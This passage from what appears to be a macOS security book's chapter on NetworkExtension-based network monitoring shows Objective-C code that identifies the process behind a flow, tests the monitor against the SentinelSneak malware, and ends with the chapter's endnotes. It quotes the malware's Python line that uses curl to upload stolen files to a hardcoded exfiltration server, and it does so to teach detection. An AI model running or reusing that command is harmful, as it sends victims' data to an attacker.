<tbody>&#13;
<tr>&#13;
<td class="TBF"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">socketType</span></p></td>&#13;
<td class="TBF"><p class="TB1"><span class="SANS_Futura_Std_Book_11">int</span></p></td>&#13;
<td class="TBF"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Socket type, such as</span> <span class="SANS_TheSansMonoCd_W5Regular_11">SOCK_STREAM</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">socketFamily</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">int</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Socket family, such as</span> <span class="SANS_TheSansMonoCd_W5Regular_11">AF_INET</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TBL"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">socketProtocol</span></p></td>&#13;
<td class="TBL"><p class="TB1"><span class="SANS_Futura_Std_Book_11">int</span></p></td>&#13;
<td class="TBL"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Socket protocol, such as</span> <span class="SANS_TheSansMonoCd_W5Regular_11">IPPROTO_TCP</span></p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="TX">From the <span class="SANS_TheSansMonoCd_W5Regular_11">remoteEndpoint</span> and the <span class="SANS_TheSansMonoCd_W5Regular_11">socket</span> instance variables, you can extract information to be fed into network-based heuristics. For example, you might craft a heuristic that flags any network traffic bound to nonstandard ports.</p>&#13;
<p class="TX">To identify the responsible process, <span class="SANS_TheSansMonoCd_W5Regular_11">NEFilterFlow</span> objects have the <span class="SANS_TheSansMonoCd_W5Regular_11">sourceAppIdentifier</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">sourceAppAuditToken</span> properties. We’ll focus on the latter, as it can provide us with both a process ID and process path. <a href="chapter7.xhtml#Lis7-17">Listing 7-17</a> performs this extraction by following the same approach we took in the DNS monitor.</p>&#13;
<span id="Lis7-17"/>&#13;
<pre><code>CFURLRef path = NULL;&#13;
SecCodeRef code = NULL;&#13;
audit_token_t* token = (audit_token_t*)flow.sourceAppAuditToken.bytes;&#13;
&#13;
pid_t pid = audit_token_to_pid(*token);&#13;
&#13;
SecCodeCopyGuestWithAttributes(NULL, (__bridge CFDictionaryRef _Nullable)(@{(__bridge NSString&#13;
*)kSecGuestAttributeAudit:flow.sourceAppAuditToken}), kSecCSDefaultFlags, &amp;code);&#13;
&#13;
SecCodeCopyPath(code, kSecCSDefaultFlags, &amp;path);&#13;
&#13;
// Do something with the process ID and path.&#13;
&#13;
CFRelease(path);&#13;
CFRelease(code);&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 7-17: Identifying the responsible process from a flow</span></p>&#13;
<p class="TX">We extract the audit token from the flow and then call the <span class="SANS_TheSansMonoCd_W5Regular_11">audit_token_to_pid</span> function to obtain the responsible process’s ID. We also use the audit token to obtain a code reference, then call <span class="SANS_TheSansMonoCd_W5Regular_11">SecCodeCopyPath</span> to retrieve the process’s path.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec14">&#13;
&#13;
<h4 class="H2"><span id="sec14"/><span id="h2-59"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Running the Monitor</span></h4>&#13;
<p class="TNI">If we compile this code as part of a project that implements a complete, properly entitled network extension, we can globally observe all outbound network flows in real time and then extract information about each flow’s remote endpoint and responsible process. Yes, this means now we can easily detect basic malware such as Dummy, but let’s test the tool against a relevant specimen of macOS malware, SentinelSneak.</p>&#13;
<p class="TX">Detected at the end of 2022, this malicious Python package targeted developers with the goal of exfiltrating sensitive data.<sup><a role="doc-noteref" id="chapter7_14" href="#chapter7-14">14</a></sup> It used a <span role="doc-pagebreak" epub:type="pagebreak" id="pg_175" aria-label="175"/>hardcoded IP address for its command-and-control server. From its unobfuscated Python code, we can see that <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> uploaded information from an infected system to an exfiltration server found at 54.254.189.27:</p>&#13;
&#13;
<pre><code>command = "curl -k -F \"file=@" + zipname + "\" \"https://54.254.189.27/api/&#13;
v1/file/upload\" &gt; /dev/null 2&gt;&amp;1"&#13;
os.system(command)&#13;
</code></pre>&#13;
<p class="TX">This means the DNS monitor we wrote earlier in this chapter wouldn’t detect its unauthorized network access. But the filter data provider should capture and display the following:</p>&#13;
&#13;
<pre><code>flow:&#13;
    identifier = D89B5B5D-793C-4940-41BD-B091F4C00700&#13;
    sourceAppIdentifier =.com.apple.curl&#13;
    sourceAppVersion =&#13;
    sourceAppUniqueIdentifier = {length = 20, bytes =&#13;
    0xbbb73e021281eee708f86d974c91182e955de441}&#13;
    procPID = 87558&#13;
    eprocPID = 87558&#13;
    direction = outbound&#13;
    inBytes = 0&#13;
    outBytes = 0&#13;
    signature = {length = 32, bytes = 0x4ee4a2f2 72c06264&#13;
    f38d479b 6ea2dc39 ... 74aa159c 9153147b}&#13;
    socketID = 7c0f491b0bd41&#13;
    localEndpoint = 0.0.0.0:0&#13;
    remoteEndpoint = 54.254.189.27:443&#13;
    protocol = 6&#13;
    family = 2&#13;
    type = 1&#13;
    procUUID = 9C547A5F-AD1C-307C-8C16-426EF9EE2F7F&#13;
    eprocUUID = 9C547A5F-AD1C-307C-8C16-426EF9EE2F7F&#13;
&#13;
Remote Endpoint: 54.254.189.27:443&#13;
&#13;
Process ID: 87558&#13;
Process Path: /usr/bin/curl&#13;
</code></pre>&#13;
<p class="TX">As you can see, it was able to capture the flow, extract the remote endpoint (54.254.189.27:443), and correctly identify the responsible process as <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span>.</p>&#13;
<p class="TX">This responsible process makes detection more complex, as <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> is a legitimate macOS platform binary and not an untrusted component of the malware. What might we do? Well, using methods covered in <span class="Xref"><a href="chapter1.xhtml">Chapter 1</a></span>, we could extract the arguments with which the malware has executed <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span>:</p>&#13;
&#13;
<pre><code>-k -F "file=<var>&lt;some file&gt;</var>" https://54.254.189.27/api/v1/file/upload</code></pre>&#13;
<p class="TX">These arguments should raise some red flags, because although legitimate software often uses <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> to download files, it’s rarely used to upload <span role="doc-pagebreak" epub:type="pagebreak" id="pg_176" aria-label="176"/>them, especially to a hardcoded IP address. Moreover, the <span class="SANS_TheSansMonoCd_W5Regular_11">-k</span> argument tells <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> to run in insecure mode, meaning the server’s SSL certificate won’t be verified. Again, this is a red flag, as legitimate software leveraging <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> wouldn’t normally run in this insecure mode.</p>&#13;
<p class="TX">You could also determine that the process’s parent is a Python script and collect the script for manual analysis, which would quickly reveal its malicious nature.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="conclusion" role="doc-conclusion" aria-labelledby="sec15">&#13;
&#13;
<h3 class="H1"><span id="sec15"/><span id="h1-51"/><span class="SANS_Futura_Std_Bold_B_11">Conclusion</span></h3>&#13;
<p class="TNI">This chapter focused on the concepts necessary for building real-time, host-based network monitoring tools by leveraging Apple’s powerful <i>NetworkExtension</i> framework. Because the vast majority of Mac malware incorporates networking capabilities, the techniques described in this chapter are essential for any malware detection system. Unauthorized network activity serves as a critical indicator for many security tools and heuristic-based detection approaches, providing an invaluable way to detect both known and unknown threats targeting macOS.</p>&#13;
</section>&#13;
<section epub:type="rearnotes" role="doc-endnotes" aria-labelledby="sec16">&#13;
&#13;
<h3 class="H1"><span id="sec16"/><span class="SANS_Futura_Std_Bold_B_11">Notes</span></h3>&#13;
<ol class="footnotes">&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter7-1" href="#chapter7_1">  1</a></span>.  “Smooth Operator,” GCHQ, June 29, 2023, <a href="https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/smooth-operator/NCSC_MAR-Smooth-Operator.pdf"><i>https://<wbr/>www<wbr/>.ncsc<wbr/>.gov<wbr/>.uk<wbr/>/static<wbr/>-assets<wbr/>/documents<wbr/>/malware<wbr/>-analysis<wbr/>-reports<wbr/>/smooth<wbr/>-operator<wbr/>/NCSC<wbr/>_MAR<wbr/>-Smooth<wbr/>-Operator<wbr/>.pdf</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter7-2" href="#chapter7_2">  2</a></span>.  Patrick Wardle, “Where There Is Love, There Is . . . Malware?” Objective-See, February 24, 2023, <a href="https://objective-see.org/blog/blog_0x72.html"><i>https://<wbr/>objective<wbr/>-see<wbr/>.org<wbr/>/blog<wbr/>/blog<wbr/>_0x72<wbr/>.html</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter7-3" href="#chapter7_3">  3</a></span>.  “Crowdstrike Endpoint Security Detection re 3CX Desktop App,” 3CX forums, March 29, 2023, <a href="https://www.3cx.com/community/threads/crowdstrike-endpoint-security-detection-re-3cx-desktop-app.119934/"><i>https://<wbr/>www<wbr/>.3cx<wbr/>.com<wbr/>/community<wbr/>/threads<wbr/>/crowdstrike<wbr/>-endpoint<wbr/>-security<wbr/>-detection<wbr/>-re<wbr/>-3cx<wbr/>-desktop<wbr/>-app<wbr/>.119934<wbr/>/</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter7-4" href="#chapter7_4">  4</a></span>.  For details on system extensions, see Will Yu, “Mac System Extensions for Threat Detection: Part 3,” <i>Elastic</i>, Feb<span class="endnoteentry_Endnote-Text-Char">ruary 19, 2020</span>, <a href="https://www.elastic.co/blog/mac-system-extensions-for-threat-detection-part-3"><i>https://<wbr/>www<wbr/>.elastic<wbr/>.co<wbr/>/blog<wbr/>/mac<wbr/>-system<wbr/>-extensions<wbr/>-for<wbr/>-threat<wbr/>-detection<wbr/>-part<wbr/>-3</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter7-5" href="#chapter7_5">  5</a></span>.  “Network Extension,” <span class="endnoteentry_Endnote-Text-Char">Apple Developer</span> Documentation, <a href="https://developer.apple.com/documentation/networkextension?language=objc"><i>https://<wbr/>developer<wbr/>.apple<wbr/>.com<wbr/>/documentation<wbr/>/networkextension<wbr/>?language<wbr/>=objc</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter7-6" href="#chapter7_6">  6</a></span>.  “Installing System Extensions and Drivers,” Apple Developer Documentation, <a href="https://developer.apple.com/documentation/systemextensions/installing-system-extensions-and-drivers?language=objc"><i>https://<wbr/>developer<wbr/>.apple<wbr/>.com<wbr/>/documentation<wbr/>/systemextensions<wbr/>/installing<wbr/>-system<wbr/>-extensions<wbr/>-and<wbr/>-drivers<wbr/>?language<wbr/>=objc</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter7-7" href="#chapter7_7">  7</a></span>.  See also <a href="https://objective-see.org/products/utilities.html#DNSMonitor"><i>https://<wbr/>objective<wbr/>-see<wbr/>.org<wbr/>/products<wbr/>/utilities<wbr/>.html#DNSMonitor</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter7-8" href="#chapter7_8">  8</a></span>.  “activationRequestForExtension:queue:,” <span class="endnoteentry_Endnote-Text-Char">Apple Developer Documentation,</span> <a href="https://developer.apple.com/documentation/systemextensions/ossystemextensionrequest/activationrequest(forextensionwithidentifier:queue:)?language=objc"><i>https://<wbr/>developer<wbr/>.apple<wbr/>.com<wbr/>/documentation<wbr/>/systemextensions<wbr/>/ossystemextensionrequest<wbr/>/activationrequest(forextensionwithidentifier:queue:)<wbr/>?language<wbr/>=objc</i></a>.</p></li>&#13;
<li><p class="NTX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_177" aria-label="177"/><span class="en_tx"><a id="chapter7-9" href="#chapter7_9">  9</a></span>.  “OSSystemExtensionRequestDelegate,” Apple Developer Documentation, <a href="https://developer.apple.com/documentation/systemextensions/ossystemextensionrequestdelegate?language=objc"><i>https://<wbr/>developer<wbr/>.apple<wbr/>.com<wbr/>/documentation<wbr/>/systemextensions<wbr/>/ossystemextensionrequestdelegate<wbr/>?language<wbr/>=objc</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter7-10" href="#chapter7_10">10</a></span>.  “startSystemExtensionMode,” Apple Developer Documentation, <a href="https://developer.apple.com/documentation/networkextension/neprovider/3197862-startsystemextensionmode?language=objc"><i>https://<wbr/>developer<wbr/>.apple<wbr/>.com<wbr/>/documentation<wbr/>/networkextension<wbr/>/neprovider<wbr/>/3197862<wbr/>-startsystemextensionmode<wbr/>?language<wbr/>=objc</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter7-11" href="#chapter7_11">11</a></span>.  “NEDNSProxyProvider,” Apple Developer Documentation, <a href="https://developer.apple.com/documentation/networkextension/nednsproxyprovider?language=objc"><i>https://<wbr/>developer<wbr/>.apple<wbr/>.com<wbr/>/documentation<wbr/>/networkextension<wbr/>/nednsproxyprovider<wbr/>?language<wbr/>=objc</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter7-12" href="#chapter7_12">12</a></span>.  Dan Goodin, “Apple Lets Some Big Sur Network Traffic Bypass Firewalls,” Arstechnica, November 17, 2020, <a href="https://arstechnica.com/gadgets/2020/11/apple-lets-some-big-sur-network-traffic-bypass-firewalls/"><i>https://<wbr/>arstechnica<wbr/>.com<wbr/>/gadgets<wbr/>/2020<wbr/>/11<wbr/>/apple<wbr/>-lets<wbr/>-some<wbr/>-big<wbr/>-sur<wbr/>-network<wbr/>-traffic<wbr/>-bypass<wbr/>-firewalls<wbr/>/</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter7-13" href="#chapter7_13">13</a></span>.  Filipe Esp<span class="endnoteentry_accent">ó</span>sito, “macOS Big Sur 11.2 beta 2 Removes Filter That Lets Apple Apps Bypass Third-Party Firewalls,” 9to5Mac, January 13, 2021, <a href="https://9to5mac.com/2021/01/13/macos-big-sur-11-2-beta-2-removes-filter-that-lets-apple-apps-bypass-third-party-firewalls/"><i>https://<wbr/>9to5mac<wbr/>.com<wbr/>/2021<wbr/>/01<wbr/>/13<wbr/>/macos<wbr/>-big<wbr/>-sur<wbr/>-11<wbr/>-2<wbr/>-beta<wbr/>-2<wbr/>-removes<wbr/>-filter<wbr/>-that<wbr/>-lets<wbr/>-apple<wbr/>-apps<wbr/>-bypass<wbr/>-third<wbr/>-party<wbr/>-firewalls<wbr/>/</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter7-14" href="#chapter7_14">14</a></span>.  Patrick Wardle, “The Mac Malware of 2022,” Objective-See, January 1, 2023, <a href="https://objective-see.org/blog/blog_0x71.html"><i>https://<wbr/>objective<wbr/>-see<wbr/>.org<wbr/>/blog<wbr/>/blog<wbr/>_0x71<wbr/>.html</i></a>.</p></li>&#13;
</ol>&#13;
</section>&#13;
</section>&#13;
</div>
</div>
</body></html>